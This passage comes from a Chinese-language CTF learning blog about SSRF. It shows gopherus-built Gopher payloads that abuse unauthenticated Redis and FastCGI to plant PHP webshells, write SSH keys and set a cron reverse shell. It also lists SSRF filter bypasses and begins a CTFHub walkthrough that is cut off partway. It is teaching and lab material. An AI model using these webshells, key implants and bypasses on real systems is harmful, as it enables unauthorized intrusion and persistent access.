title="结合redis未授权"></a>结合redis未授权</h3><p>首先我们得知道redis是什么。</p><p>Redis 是Remote Dictionary Server(Redis) 的缩写，中文翻译为远程字典服务器，是一个使用 C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型的Key-Value数据库，并提供多种语言的API。</p><p>它是一种 NoSQL（not-only sql，泛指非关系型数据库）的数据库，可以用作数据库、缓存、消息中间件、分布式锁等。</p><p>简单来说，redis是一种数据库，但和MySQL不同，MySQL是一种关系型数据库，而redis是一种非关系型数据库。</p><p>在SSRF漏洞中，如果通过端口扫描等方法发现目标主机上开放6379端口，则目标主机上很有可能存在Redis服务。此时，如果目标主机上的Redis由于没有设置密码认证、没有进行添加防火墙等原因存在未授权访问漏洞的话，那我们就可以利用Gopher协议远程操纵目标主机上的Redis，可以利用 Redis 自身的提供的 config 命令向目标主机写WebShell、写SSH公钥、创建计划任务反弹Shell等……</p><p>简单来说，利用redis有些类似之前的未授权MySQL，我们刚学过用MySQL去查甚至写入命令，那么用redis也是可以的</p><p>像之前一样，我们也可以自己一步一步构造payload。</p><p>先打开监听</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021954310.png">​</p><p>然后输入所需命令，写入我们的一句话木马，最后别忘了quit。</p><p>还是用wireshark打开我们截的redis,pcapng。</p><p>然后就是URL编码。</p><p>但这样实在太过复杂，用gopherus会方便一些。</p><p>我们这里讲三种redis利用方式，就是前文提到的向目标主机写WebShell、写SSH公钥、创建计划任务反弹Shell</p><p><strong>第一种：向目标主机写WebShell</strong></p><p>这里我们启动gopherus，攻击redis，</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./gopherus.py</span> <span class="hljs-params">--exploit</span> redis<br></code></pre></td></tr></table></figure><p>选择phpshell，默认路径（回车跳过就行），</p><p>这里payload一定我们自己写（gopherus默认是get型的，而且还不一定好使）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021954201.png">​</p><p>复制payload，在bp里再来一次URL编码</p><p>gopherus生成的payload我们选择的默认路径，而且默认生成的是shell.php，所以我们用蚁剑去连接shell.php，连接密码我们设置的是cmd</p><p><strong>第二种：创建计划任务反弹Shell</strong></p><p>反弹Shell是什么？</p><p>我们之前都写过webshell，webshell可以说是一种正向shell，也就是我们发送请求去连接对方靶机，但除了这种正向连接的方式，还可以让对方靶机反过来来连接咱们。</p><p>而反弹就是指对方靶机发送请求来连接我们的服务器。</p><p>那这是怎么做到的，也就是其中原理是什么呢？</p><p>其实也是向靶机写入一句话木马，这个木马的作用是在靶机建立一个交互（可以执行系统命令），并将其重定向到我们的服务器。换句话说，也就是对方把他的终端交互页面发送到我们服务器上。</p><p>这样的话，只要我们服务器与其建立连接，就可以直接操纵交互页面，也就是说，可以直接执行系统命令。</p><p>具体怎么构造一句话木马去反弹shell，这里就不展开讲了，我们只需要知道，重定向时需要我们的IP以及端口来进行连接。所以我们这里需要指定一个关口，然后在这个端口打开监听，等待对方链接咱们。</p><p>下面我们进入正题</p><p>如果我们还是拦截抓包从头构造，需要注意以下几点：</p><p>1.权限问题，ubuntu定时任务需要root权限</p><p>2.redis备份文件存在乱码，在Ubuntu上会报错，而在Centos上不会报错</p><p>3.使用SSRF利用此漏洞切记在写入计划任务前后要加上\n来进行换行，否则数据污染会导致计划任务无法执行</p><p>具体怎么从头构造，和之前大差不差，这里我们不多赘述，直接用gopherus</p><p>打开gopherus，攻击redis</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./gopherus.py</span> <span class="hljs-params">--exploit</span> redis<br></code></pre></td></tr></table></figure><p>选择反弹shell，即ReverseShell</p><p>填入自己的IP，这里作者用默认的，也就是127.0.0.1，直接回车</p><p>下一步具体的构造也是默认，直接回车</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021954648.png">​</p><p>可以看到payload用的我们的1234端口，然后让我们发送请求之前先打开1234端口的监听</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">1234</span><br></code></pre></td></tr></table></figure><p>打开监听，发送请求，等待即可</p><p><strong>第三种：写入SSH公钥</strong></p><p>如果对方主机开启了ssh，可以尝试写入SSH文件，从而进行ssh登录</p><p>先用kali生成一对密钥对</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ssh-keygen -t rsa</span><br></code></pre></td></tr></table></figure><p>一路回车即可</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021954711.png">​</p><p>然后看到上面显示的路径，进入路径，ls一下</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021954550.png">​</p><p>其中id_rsa.pub就是我们要写入对方靶机的</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021954810.png">​</p><p>这里为了方便我们让gopherus先生成一个WebShell。</p><p>因为gopherus不能直接生成ssh的payload，然后我们从头抓包又太麻烦，所以这里先生成一个，然后我们再对其修改一下</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021954988.png">​</p><p>复制生成的payload到bp，然后进行一次URL解码</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021954053.png">​</p><p>然后就变成这样，</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021954936.png">​</p><p>简单给大家解释一下</p><p>*n代表下面的命令由n个参数组成，$m代表下一个参数有m个字符。我们拿下面的payload为例，从头解释一下。</p><p>*1代表有下面的命令1个变量，$8代表下一个参数有8个字符，也就是“flushall”。</p><p>总的来看，第一条命令就是flushall。</p><p>紧接着看下一条命令，*3代表有下面的命令3个变量，$3代表下一个参数有3个字符，也就是“set”，$1代表下一个参数有1个字符，也就是“1”，$34代表下一个参数有34个字符，也就是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">“<br> <br> <br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br> <br> <br>*<span class="hljs-number">4</span>”<br></code></pre></td></tr></table></figure><p>总的来看，第二条命令就是set 1 \n\n\n\n。（这里用\n代表空格）</p><p>以此类推……</p><p>接下来进行修改，我们要修改三个地方，即payload、要写入的目的地址、写入的文件名。</p><p>注意：修改完参数后，一定也要修改$符号后面的数值，使其与参数的字符数相匹配。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021954241.png">​</p><p>然后我们分别将其修改为：</p><p>id_rsa.pub中所有内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCYqXFf2fwoVhDid7+PWc79foFxzr8WxiTY+zx8HplwY7h2lxXEtHeSO8SAAw8th/Oiba6VqyXpASDDcYLWBM/sP1Rsan09lgJN43o1VkVzbqJD4iBNKV8PXt4JNLD7YVzMsqlg3i7xY6lu/efcQ2LBfDfv2HNPzEjbZ2OnhDPbxKzSEYas/SalE35Bh+zzNRv6CSihT31vN3gsZRaDP5rxtjJIUUueqNbr3iasLWIGEdlMmjxht99ZBtPETwke9gKiwmklRCDYdmn2pf01E0ol0V/XS/tsfVRZi/CNfUWL45OZF4rvQqA7UG1psxkEqzFxkFyeKaUJR7e50Qz2uwrU3wsJnmixO/a24MPcKcevE95VWN+nys7moJo9/jXwxrjAqVf5Gx9ztvZRM4g7+AEjwXLCUtz7L85dAYpNMK9I4/AnXgIFID9/plWzCV3Pa4FR4CI/lcBtyGsZOpO3fgrKPQv8xoWAcxx37BO5D3oxvYQMRrN1A0L8tImkHvYPo2c= matrix@matrix<br></code></pre></td></tr></table></figure><p>和</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/root/</span>.ssh/<br></code></pre></td></tr></table></figure><p>和</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">authorized_keys</span><br></code></pre></td></tr></table></figure><p>这里注意写入路径&#x2F;root&#x2F;.ssh&#x2F;要求我们有root权限。</p><p>上面的内容按规范来，不要随便修改。</p><p>然后我们再修改字符数，bp这里选择后会显示字符数，能方便一些</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021954060.png">​</p><p>但要注意，这里有个坑人的地方，bp或者notepad++里把换行符看作两个字符，但我们这里计算$后的值时，把换行符看作一个字符。</p><p>我们这里的换行符是必不可少的，只能注意这个细节。</p><p>最后修改完是这样</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021954368.png">​</p><p>然后别忘URL编码，提交</p><p>最后这里，我们去连接对方靶机</p><p>注意在之前我们提到的路径下执行这条命令，否则用-i调用私钥id_rsa时需要用绝对地址，-p是对方端口，后面紧跟着对方靶机的IP（根据情况自己修改）。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021955044.png">​</p><p>当然以上三种方法肯定不是通用的，要注意其局限性：</p><p>需要知道要写的文件地址和路径；</p><p>需要对写入文件有读写权限；</p><p>会写入很多无用数据，可能会导致程序出错；</p><p>需要利用到其他程序，比如web应用程序，如果利用docker部署，上述方法即失效。</p><p> 进一步了解可以参考：<a href="https://www.freebuf.com/articles/network/280984.html" title="Redis 常见漏洞利用方法总结 - FreeBuf网络安全行业门户">Redis 常见漏洞利用方法总结 - FreeBuf网络安全行业门户</a></p><h3 id="结合FastCGI"><a href="#结合FastCGI" class="headerlink" title="结合FastCGI"></a>结合FastCGI</h3><p><strong>FastCGI是什么？</strong></p><p>Fastcgi其实是一个通信协议，和HTTP协议一样，都是进行数据交换的一个通道。</p><p>HTTP协议是浏览器和服务器中间件进行数据交换的协议，浏览器将HTTP头和HTTP体用某个规则组装成数据包，以TCP的方式发送到服务器中间件，服务器中间件按照规则将数据包解码，并按要求拿到用户需要的数据，再以HTTP协议的规则打包返回给服务器。</p><p>类比HTTP协议来说，fastcgi协议则是服务器中间件和某个语言后端进行数据交换的协议。Fastcgi协议由多个record组成，record也有header和body一说，服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。</p><p>nginx本身不能处理PHP，它只是个web服务器，当接收到请求后，如果是php请求，则发给php解释器处理，并把结果返回给客户端。nginx一般是把请求发fastcgi管理进程处理，fascgi管理进程选择cgi子进程处理结果并返回被nginx</p><p>简而言之，nginx只是一个服务器，php相关的活还得转交给背后的php干，而fastcgi就是这个“通讯兵”，而且是遵从某种转接规则的通讯兵，而php-fpm就是管理这些“通讯兵”的长官。</p><p><strong>攻击实现原理</strong></p><p>那么，为什么我们控制fastcgi协议通信的内容，就能执行任意PHP代码呢？</p><p>理论上当然是不可以的，即使我们能控制SCRIPT_FILENAME，让fpm执行任意文件，也只是执行目标服务器上的文件，并不能执行我们需要其执行的文件。</p><p>但PHP是一门强大的语言，PHP.INI中有两个有趣的配置项，auto_prepend_file和auto_append_file。</p><p>auto_prepend_file是告诉PHP，在执行目标文件之前，先包含auto_prepend_file中指定的文件；auto_append_file是告诉PHP，在执行完成目标文件后，包含auto_append_file指向的文件。</p><p>那么就有趣了，假设我们设置auto_prepend_file为php:&#x2F;&#x2F;input，那么就等于在执行任何php文件前都要包含一遍POST的内容。所以，我们只需要把待执行的代码放在Body中，他们就能被执行了。（当然，还需要开启远程文件包含选项allow_url_include）</p><p>对FastCGI详细了解可以参考：</p><p><a href="https://blog.csdn.net/mysteryflower/article/details/94386461" title="Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写_flower未授权-CSDN博客">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写_flower未授权-CSDN博客</a></p><p>这里我们直接用工具gopherus。</p><p>先用base64加密一句话木马，一会要用</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021955809.png">​</p><p>这里我们用gopherus构造payload。</p><p>启动gopherus，攻击fastcgi，</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./gopherus.py</span> <span class="hljs-params">--exploit</span> fastcgi<br></code></pre></td></tr></table></figure><p>提供一个已知的php文件，（假设已知index.php文件，实际要根据情况判断，实在不知道就用gopherus默认的，按回车跳过就行）</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/i</span>ndex.php<br></code></pre></td></tr></table></figure><p>写上我们想在终端执行的命令：在shell.php中写上一句话木马（便于蚁剑连接）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=&quot;</span> | <span class="hljs-built_in">base64</span> -d &gt; shell.php<br></code></pre></td></tr></table></figure><p>有人会问我们为什么要先base64编码一句话木马，然后解码写入文件内。</p><p>其实是因为直接写入是不行的：</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021955722.png">​</p><p>这样就生成payload了</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021955949.png">​</p><p>复制payload，gopherus生成的payload只有一次URL编码，需要的话我们得在bp里再来一次</p><p>我们在终端执行的命令是：给base64编码的一句话木马解码并写在shell.php中。</p><p>所以我们用蚁剑去链接shell.php，连接密码我们设置的是cmd。</p><h2 id="SSRF-Bypass"><a href="#SSRF-Bypass" class="headerlink" title="SSRF Bypass"></a>SSRF Bypass</h2><h3 id="URL-Bypass"><a href="#URL-Bypass" class="headerlink" title="URL Bypass"></a>URL Bypass</h3><p>有时候会强制我们用<a href="http://xxx.com,但我们想访问的是http//">http://xxx.com，但我们想访问的是http://</a> 127.0.0.1&#x2F;flag.php，这时候我们可以用：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">http:</span>//xxx.com<span class="hljs-subst">@127</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/flag.php<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://xxx.com.127.0.0.1.nip.io/flag.php<br></code></pre></td></tr></table></figure><p>效果都与<a href="http://127.0.0.1/flag.php%E7%9B%B8%E5%90%8C">http://127.0.0.1/flag.php相同</a></p><h3 id="ID-Bypass"><a href="#ID-Bypass" class="headerlink" title="ID Bypass"></a>ID Bypass</h3><p>倘若我们要访问http:&#x2F;&#x2F; 127.0.0.1&#x2F;flag.php，但是却ban了<a href="http://127.0.0.1/">http://127.0.0.1</a></p><p>我们可以用以下方式应对，</p><p>八进制：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">url</span>=http://<span class="hljs-number">017700000001</span>/flag.php<br> <br><span class="hljs-attribute">url</span>=http://<span class="hljs-number">0177</span>.<span class="hljs-number">0000</span>.<span class="hljs-number">0000</span>.<span class="hljs-number">0001</span>/flag.php<br></code></pre></td></tr></table></figure><p>十六进制：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">url</span>=http://<span class="hljs-number">0</span>x7F000001/flag.php<br> <br><span class="hljs-attribute">url</span>=http://<span class="hljs-number">0</span>x7F.<span class="hljs-number">0</span>x00.<span class="hljs-number">0</span>x00.<span class="hljs-number">0</span>x01/flag.php<br> <br><span class="hljs-attribute">url</span>=http://<span class="hljs-number">0</span>x7F.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>/flag.php<br></code></pre></td></tr></table></figure><p>十进制：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">url</span>=http://<span class="hljs-number">2130706433</span>/flag.php<br></code></pre></td></tr></table></figure><p>使用localhost：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">url</span>=http://localhost/flag.php<br></code></pre></td></tr></table></figure><p>像这种<strong>绕过限制请求IP不为内网地址：</strong></p><p>（1）采用短网址绕过，生成短网址地址链接：</p><p><a href="https://www.ft12.com/" title="短网址,短网址生成,短链接,飞天天网,网址缩短_ft12.com短网址">短网址,短网址生成,短链接,飞天天网,网址缩短_ft12.com短网址</a></p><p>（2）利用特殊域名，<code>xip.io</code>可以指向任意域名（原理是DNS解析），即<code>127.0.0.1.xip.io</code>，可以解析为<code>127.0.0.1</code>。（当我们访问这个网站的子域名时，如<code>192.168.0.1.xip.io</code>，会自动重定向到<code>192.168.0.1</code>。因此也算一种302跳转，即IP地址设为<code>ip.xip.io</code>或<code>www.ip.xip.io</code>。）</p><p>（3）采用进制转换，<code>127.0.0.1</code>八进制：<code>0177.0.0.1</code>；十六进制：<code>0x7f.0.0.1</code>；十进制：<code>2130706433</code></p><p>（4）利用<code>[::]</code>，<code>http://[::]:80/</code> 会解析为 <code>http://127.0.0.1</code></p><p>（5）添加端口号，<code>http://127.0.0.1:8080</code></p><p>（6）利用句号，<code>127。0。0。1</code> 会解析为 <code>127.0.0.1</code></p><p>（7）<strong>@符</strong>：<code>http://xxx.com@127.0.0.1/flag.php</code>，效果都与<code>http://127.0.0.1/flag.php</code>相同</p><p>（8）<strong>封闭式字母数字(Enclosed Alphanumerics):</strong></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021955038.jpeg">​</p><h3 id="302跳转-Bypass"><a href="#302跳转-Bypass" class="headerlink" title="302跳转 Bypass"></a>302跳转 Bypass</h3><p><strong>限制请求只为http协议：</strong></p><p>（1）采用302跳转</p><p>（2）采用短地址</p><p>在自己的服务器上写入下面的302跳转代码，作用是让访问者重定向回127.0.0.1&#x2F;flag.php。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: http://127.0.0.1/flag.php&quot;</span>);<br> <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>假设我们把302跳转代码写入302.php，然后我们在302.php所在文件夹处执行下面这条命令</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">php</span> -S <span class="hljs-number">0.0.0.0:7777</span><br></code></pre></td></tr></table></figure><p>作用是启动服务器，这里开放的是7777端口（不能用python，我们这里写的是PHP重定向代码）</p><p>然后去访问：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">url</span>=yourip:port/302.php<br></code></pre></td></tr></table></figure><p>这里我们开的是7777端口，所以应该写</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">url</span>=yourip:7777/302.php<br></code></pre></td></tr></table></figure><h3 id="DNS重绑定-Bypass"><a href="#DNS重绑定-Bypass" class="headerlink" title="DNS重绑定 Bypass"></a>DNS重绑定 Bypass</h3><p>DNS重绑定是什么？</p><p>你只需要有个域名，但是它映射两个IP；同时设置TTL为0，能方便两个IP即刻切换</p><p>效果类比：你访问wwfcww.xyz这个域名，第一次解析的IP是192.168.0.1；而第二次解析的IP是127.0.0.1</p><p>这个操作，就叫做DNS重绑定。</p><p>具体利用这个网站：<a href="https://lock.cmpxchg8b.com/rebinder.html" title="rbndr.us dns rebinding service">rbndr.us dns rebinding service</a></p><p>DNS重绑定可以做到对URL的host进行DNS解析时，前后两次不一样，从而可以绕过防御</p><h2 id="SSRF防御"><a href="#SSRF防御" class="headerlink" title="SSRF防御"></a>SSRF防御</h2><p>1、禁用协议  </p><p>2、限制请求端口  </p><p>3、设置URL白名单  </p><p>4、过滤返回信息  </p><p>5、统一错误信息</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://blog.csdn.net/weixin_58783105/article/details/132676162" title="服务端请求伪造(SSRF)及漏洞复现_ssrf漏洞复现-CSDN博客">服务端请求伪造(SSRF)及漏洞复现_ssrf漏洞复现-CSDN博客</a></p><p><a href="https://blog.csdn.net/2201_75571291/article/details/131168967" title="了解SSRF漏洞,这一篇就足够了......-CSDN博客">了解SSRF漏洞,这一篇就足够了……-CSDN博客</a></p><p><a href="https://blog.csdn.net/shangguanliubei/article/details/136834347" title="漏洞原理——ssrf-CSDN博客">漏洞原理——ssrf-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_45927819/article/details/123400074" title="CTFHub—SSRF_ctfhubssrf-CSDN博客">CTFHub—SSRF_ctfhubssrf-CSDN博客</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSRF-CTFHub</title>
    <link href="/2025/05/04/SSRF-CTFHub/"/>
    <url>/2025/05/04/SSRF-CTFHub/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>本文是作者由CSDN博客迁移而来，原文地址：<a href="https://blog.csdn.net/2302_81178149/article/details/145477766?spm=1001.2014.3001.5501">https://blog.csdn.net/2302_81178149/article/details/145477766?spm=1001.2014.3001.5501</a></p></blockquote><p>在众多的CTF平台当中，CTFHub对于初学者来说，是入门平台的不二之选。CTFHub通过自己独特的技能树模块，可以帮助初学者来快速入门。具体请看官方介绍：<a href="https://www.ctfhub.com/#/index" title="CTFHub">CTFHub</a>。</p><p><strong>作者的CTFHub技能树汇总：</strong></p><p><a href="https://blog.csdn.net/2302_81178149/article/details/142747270?spm=1001.2014.3001.5501" title="CTFHub技能树Web汇总-CSDN博客">CTFHub技能树Web汇总-CSDN博客</a></p><p>为了方便学习，在练习过程中可以查阅作者的SSRF总结：</p><p><a href="https://blog.csdn.net/2302_81178149/article/details/145468534" title="SSRF学习总结_前端安全ssrf-CSDN博客">SSRF学习总结_前端安全ssrf-CSDN博客</a></p><h2 id="内网访问"><a href="#内网访问" class="headerlink" title="内网访问"></a>内网访问</h2><p>原题题干让我们尝试访问位于127.0.0.1的flag.php</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021948663.png"></p><p>那我们就在URL上修改，用http伪协议去访问<a href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://challenge-<span class="hljs-number">4</span>a308c1438dda86a.sandbox.ctfhub.com:<span class="hljs-number">10800</span>/?url=http://<span class="hljs-number">127.0.0.1</span>/flag.php<br></code></pre></td></tr></table></figure><p>出flag了</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021948905.png"></p><p>这道题叫内网访问，应该是模拟我们用http伪协议去轮询arp，便于我们探测出内网的存活主机</p><h2 id="伪协议读取文件"><a href="#伪协议读取文件" class="headerlink" title="伪协议读取文件"></a>伪协议读取文件</h2><p>要求我们尝试去读取一下Web目录下的flag.php</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021948788.png"></p><p>尝试访问</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">?url=<span class="hljs-keyword">file</span>:<span class="hljs-comment"><span class="hljs-doctag">///</span>flag.php</span><br></code></pre></td></tr></table></figure><p>但没反应，<strong>想到这里提示Web目录，在var&#x2F;www&#x2F;html&#x2F;flag.php</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>challenge-<span class="hljs-number">62670</span>b218992efbe.sandbox.ctfhub.com:<span class="hljs-number">10800</span><span class="hljs-regexp">/?url=file:/</span><span class="hljs-regexp">//</span>var<span class="hljs-regexp">/www/</span>html/flag.php<br></code></pre></td></tr></table></figure><p>发现只有三个问号，</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021948386.png"></p><p>查看源代码才出现flag</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021948453.png"></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>逆天题目介绍</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021948393.png"></p><p>这一看就是模拟的端口扫描，我们还是用http协议</p><p>前面我们已经内网访问了，访问的是127.0.0.1，这里也没给别的，应该还是这个，端口范围应该是8000-9000。</p><p>那就用bp爆破</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?u</span>rl=<span class="hljs-symbol">dict:</span>/<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-symbol">:</span><span class="hljs-number">8000</span><br></code></pre></td></tr></table></figure><p>抓包，发送到Intruder</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021948472.png"></p><p>他这里自动给咱们加了payload，但没加对，我们先clear掉（下面图片框错了，应该框下面的Clear）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021948718.png"></p><p>只爆破端口就行，所以在端口处加payload</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021948185.png"></p><p>Payload set选择numbers，范围是8000-9000，step是1</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021948342.png"></p><p>这里都是状态码都是200ok，没法通过这个判断，但是要是其中有一个返回flag，长度肯定不一样，我们点击length排序</p><p>发现这只有一个长度为360的，然后我们看response，出现flag</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021948406.png"></p><p>其实用dict伪协议也比较高效</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021948678.png"></p><p>但请求后显示bad request，可能是不支持或者禁用了？</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021949571.png"></p><h2 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h2><p>这道题从题目上看，应该是POST请求，而POST请求我们需要用gopher</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021949965.png"></p><p>但是我们用gopher去传递什么呢？</p><p>尝试访问一下flag.php</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://challenge-<span class="hljs-number">2784</span>d5d9d94613d0.sandbox.ctfhub.com:<span class="hljs-number">10800</span>/?url=http://<span class="hljs-number">127.0.0.1</span>/flag.php<br></code></pre></td></tr></table></figure><p>只有一个框</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021949679.png"></p><p>查看源代码，发现key值，在框里传输试试</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021949304.png"></p><p>发现302重定向到&#x2F;flag.php</p><p><img 